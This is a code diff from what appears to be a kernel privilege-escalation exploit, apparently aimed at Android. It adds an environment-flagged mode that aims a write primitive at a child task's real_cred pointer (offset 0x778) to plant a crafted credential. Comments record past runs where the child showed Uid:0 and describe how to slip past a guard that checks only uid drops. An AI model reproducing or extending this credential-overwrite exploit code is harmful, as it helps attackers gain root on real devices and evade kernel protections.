@@ -465,6 +465,19 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
+        if (env_flag("MODE4_CAPS778", 0) && g_child_cred) {
+          /* Jev rank-2 (09-20): write caps cred to task->real_cred
+           * (+0x778) — the HISTORICALLY WORKING slot where init_cred
+           * landed (child lived 2 min, /proc showed Uid:0). If the
+           * guard only checks uid drops and our cred has uid=2000
+           * (no drop), the child should get caps and SURVIVE. */
+          g_main_pc = (uint64_t)g_child_cred;
+          g_main_left = (uint64_t)(g_child_task + 0x778);
+          pr_info("JC2 CAPS778: pc=%016llx (caps-cred) "
+                  "left=%016llx (child+0x778 real_cred)\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
         if (env_flag("MODE4_SAME_CRED", 0) && g_child_task) {
           /* TEST A/C (09-20 decisive): write a QUIET PAGE value into
            * +0x780 — not the original cred (can't read it), but our
